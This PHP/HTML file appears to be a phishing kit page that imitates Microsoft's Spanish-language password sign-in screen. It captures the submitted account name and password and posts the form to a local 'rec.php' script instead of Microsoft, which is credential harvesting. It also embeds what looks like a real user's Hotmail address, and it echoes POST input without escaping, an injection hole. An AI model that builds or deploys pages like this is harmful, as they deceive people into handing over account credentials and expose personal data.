<?php
session_start();
error_reporting(0);
$loginfmt = $_POST['loginfmt'];
$passwd = $_POST['passwd'];
?>
<!DOCTYPE html>
<html dir="ltr" lang="ES-ES">
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><base href=""><script type="text/javascript">/* Code removed by ScrapBook */</script><noscript><meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=ES-ES&lc=3082&uaid=df9cef49f8e44095a77afe4745d6420f"/>La cuenta Microsoft requiere JavaScript para iniciar sesión. Este explorador web no admite JavaScript o los scripts están bloqueados.<br /><br />Para averiguar si el explorador admite JavaScript o para permitir los scripts, consulta la ayuda en pantalla del explorador.</noscript><title>Iniciar sesión en tu cuenta Microsoft</title><meta name="robots" content="none"><meta name="PageID" content="i5030"><meta name="SiteID" content="1184"><meta name="ReqLC" content="3082"><meta name="LocLC" content="3082"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript">/* Code removed by ScrapBook */</script><link rel="shortcut icon" href="favicon.ico"><link rel="stylesheet" title="Converged_v2" type="text/css" href="Converged_v23082_AZXChPIB5jI3ijrmoNll5w2.css"><style type="text/css"></style><style type="text/css">body{display:none;}</style><script type="text/javascript">/* Code removed by ScrapBook */</script><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript><script type="text/javascript">/* Code removed by ScrapBook */</script><link rel="image_src" href="https://logincdn.msauth.net/16.000.28510.10/images/Windows_Live_v_thumb.jpg"><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript" src="about:blank" id="ConvergedLoginPaginatedStrings" crossorigin="anonymous" integrity="sha384-jBiOG7esl7C79MxeZD3wjTBmvHnV+ZtWL8VZa6T3VDzqQHLEyYixuB3caq0/2u+I"></script><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript">/* Code removed by ScrapBook */</script><script type="text/javascript" src="about:blank" id="OldConvergedLogin_PCore" crossorigin="anonymous" integrity="sha384-0pfVPwu8cT85Y/GiP/xaJ1Ze07q80FmNXkImIaCRxAfJ7dq3EadE/BgqCR8H8Kbh"></script></head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><!--  --><!--  --> <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <div data-bind="if: activeDialog"></div>


 <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="rec.php">
 
<input type="hidden" name="loginfmt" id="loginfmt" value="<?php print $loginfmt ?>">
<input type="hidden" name="passwd" id="passwd" value="<?php print $passwd ?>">

<!-- ko if: svr.CO --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.f,
            showFooterLinks: true,
            useWizardBehavior: svr.BC,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.ay --><!-- /ko --> <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }"><!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner fade-in-lightbox" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButtons,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }"> <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.bl &amp;&amp; showLightboxProgress() }"></div><!-- ko if: showLightboxProgress --><!-- /ko --><!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) --> <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/16.000.28510.10/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/16.000.28510.10/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.cc && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: asyncInitReady --> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.ae,
                            disableAnimationIfAnimationEndUnsupported: svr.bp,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }"><!--  --> <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class=""><!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.h) --> <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next"> <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.be,
                displayName: sharedData.displayName || svr.h,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --> <button type="button" class="backButton" data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Atrás"><!-- ko ifnot: svr.b0 --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.b0 --><!-- /ko --> </button>
<!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title=""></div> </div></div> </div><!-- /ko --> <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.h),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- ko if: $parent.isViewLoaded --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            evictedCreds: sharedData.evictedCreds,
                            useEvictedCredentials: sharedData.useEvictedCredentials,
                            showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.AC === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  --><!--  -->
							
<input name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0" type="hidden"> <input name="login" data-bind="value: unsafe_username" value="simelemontolomeo@hotmail.com" type="hidden"> <input name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="text"><input name="type" data-bind="value: svr.BC ? 20 : 11" value="11" type="hidden"> <input name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3" type="hidden"> <input name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="" type="hidden">
<input type="hidden" name="loginfmt" id="loginfmt" value="<?php print $loginfmt ?>">
 <input name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="" type="hidden"> <input name="hisRegion" data-bind="value: callMetadata.HisRegion" value="" type="hidden"> <input name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="" type="hidden"> <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Escribir contraseña</div><!-- ko if: showCredViewBrandingDesc --><!-- /ko --><!-- ko if: unsafe_pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive"><!-- ko if: passwordTextbox.error --><!-- /ko --> </div> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
				
				<input name="passwd" id="i0118" autocomplete="off" class="form-control" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: [
                    'loginHeader',
                    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
                    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                moveOffScreen: showPassword,
                css: { 'has-error': passwordTextbox.error }" aria-describedby="loginHeader  " placeholder="Contraseña" aria-label="" tabindex="0" type="password">
				<input type="hidden" name="loginfmt" id="loginfmt" value="<?php print $loginfmt ?>">
				
				<!-- ko if: svr.CK && showPassword() --><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- ko if: svr.CK --><!-- /ko --> </div> </div><!-- ko if: shouldHipInit --><!-- /ko --> <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div><!-- ko if: svr.Ce --><!-- /ko --><!-- ko if: svr.aR !== false && !svr.Ce && !tenantBranding.KeepMeSignedInDisabled --> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.G &amp;&amp; !showHipOnPasswordView"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Mantener la sesión iniciada" type="checkbox"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Mantener la sesión iniciada</span> </label> </div><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1585627963%26rver%3d7.0.6730.0%26wp%3dLBI%26wreply%3dhttps:%252f%252fwww.msn.com%252fes-es%252fhomepage%252fSecure%252fPassport%253fru%253dhttps%25253a%25252f%25252fwww.msn.com%25252fes-es%25253fpfr%25253d1%26lc%3d1033%26id%3d1184%26mkt%3des-es%26pcexp%3dTrue%26contextid%3dC354DCAE75FF72B1%26bk%3d1585628021&amp;id=1184&amp;uiflavor=web&amp;uaid=df9cef49f8e44095a77afe4745d6420f&amp;mkt=ES-ES&amp;lc=3082&amp;bk=1585628021" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.q, click: resetPassword_onClick">¿Olvidó su contraseña?</a> </div><!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko ifnot: useEvictedCredentials --><!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                redirect: onRedirect,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  --> <div class="form-group"><!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) --><!-- /ko --><!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko --><!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko --> </div><!-- ko if: credLinkError --><!-- /ko --><!-- /ko --><!-- ko if: evictedCreds.length > 0 --><!-- /ko --><!-- /ko --><!-- ko if: showChangeUserLink --><!-- /ko --> </div> </div> </div> </div> <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.f,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: false },
        event: {
            primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div class="inline-block"><!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: primaryButtonAttributes,
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Iniciar sesión" type="submit"> </div> </div></div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko ifnot: $parent.isViewLoaded --><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div> </div></div><!-- /ko --> </div><!-- ko if: showDebugDetails --><!-- /ko --><!-- ko if: showFedCredButtons --><!-- /ko --><!-- ko if: newSession --><!-- /ko --> <input name="ps" data-bind="value: postedLoginStateViewId" value="" type="hidden"> <input name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="" type="hidden"> <input name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="" type="hidden"> <input name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="" type="hidden"> <input name="canary" data-bind="value: svr.canary" value="" type="hidden"> <input name="ctx" data-bind="value: ctx" value="" type="hidden"> <input name="hpgrequestid" data-bind="value: svr.sessionId" value="" type="hidden"> <input id="i0327" data-bind="attr: { name: svr.Bt }, value: flowToken" name="PPFT" value="DU21!ujRM65JKo0Ck8g1YrkHj!noRK12Cqjt94vA6DNF0bdy3Jn164fy*OcI!YiBVIcJslaMsiGgCQ98fC!yEwwX*qh!YAMoQVdl3g6SDGRJun8lGXJBlCot0baUMOiBHnhrL361oy1n7WEnayDlCA7BuumWbqaY0nt18fpYpSOB*GeUIJm8WG0ynolhpaFyjBN54zOPafjHcNVN*lRncELih18e*9SFdSRdY9!w5o5h1DsOEbzecz1SRXtHojWWRTqdWIHMpTwTA15569ZLjQ0$" type="hidden"> <input name="PPSX" data-bind="value: svr.ca" value="Pass" type="hidden"> <input name="NewUser" value="1" type="hidden"> <input name="FoundMSAs" data-bind="value: svr.AD" value="" type="hidden"> <input name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0" type="hidden"> <input name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0" type="hidden"> <input name="CookieDisclosure" data-bind="value: svr.ay ? 1 : 0" value="0" type="hidden"> <input name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0" type="hidden"> <input name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0" type="hidden"> <div data-bind="component: { name: 'instrumentation-control',
                publicMethods: instrumentationMethods,
				<input type="hidden" name="loginfmt" id="loginfmt" value="<?php print $loginfmt ?>">
                <input name="i2" data-bind="value: clientMode" value="1" type="hidden"> <input name="i17" data-bind="value: srsFailed" value="0" type="hidden"> <input name="i18" data-bind="value: srsSuccess" type="hidden"> <input name="i19" data-bind="value: timeOnPage" value="" type="hidden"></div> <div id="footer" class="footer default" role="contentinfo" data-bind="
                css: {
                    'default': !backgroundLogoUrl(),
                    'new-background-image': useNewDefaultBackground }"> <div data-bind="component: { name: 'footer-control',
                    publicMethods: footerMethods,
                    params: {
                        serverData: svr,
                        useNewDefaultBackground: useNewDefaultBackground(),
                        hasDarkBackground: backgroundLogoUrl(),
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetails: toggleDebugDetails_onClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=ES-ES&amp;vv=1600&amp;uaid=df9cef49f8e44095a77afe4745d6420f">Términos de uso</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=ES-ES&amp;vv=1600&amp;uaid=df9cef49f8e44095a77afe4745d6420f">Privacidad y cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --><!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --> <a id="moreOptions" href="https://login.live.com/pp1600/#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo()" aria-label="Haga clic aquí para obtener información relacionada con la solución de problemas." aria-expanded="false"><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: !useNewDefaultBackground } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --> <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28510.10/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://logincdn.msauth.net/16.000.28510.10/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"><!-- /ko --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --><!-- /ko --><!-- /ko --><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: hasDarkBackground } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28510.10/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://logincdn.msauth.net/16.000.28510.10/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --> </form> <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.bd && !svr.fUseFetchSessionsForDsso --> <div data-bind="component: { name: 'fetch-sessions-control',
    params: {
        serverData: svr,
        sessionPullType: sessionPullType },
    event: {
        updateUserTiles: fetchSessions_onUpdateUserTiles,
        executeGctResult: fetchSessions_onExecuteGctResult,
        incrementAsyncTileRequestCount: fetchSessions_onIncrementAsyncTileRequestCount,
        decrementAsyncTileRequestCount: fetchSessions_onDecrementAsyncTileRequestCount } }"><!--  --><!-- ko if: (sessionPullType & 1) != 0 && callMsaStaticMeControl() --><!-- /ko --><!-- ko if: svr.desktopSsoConfig && !isNonInteractiveAuthRequest --><!-- /ko --><!-- ko if: (sessionPullType & 2) != 0 && desktopSsoRunning() --><!-- /ko --></div><!-- /ko --><!-- ko if: svr.AW --><!-- /ko --></div></body>
</html>
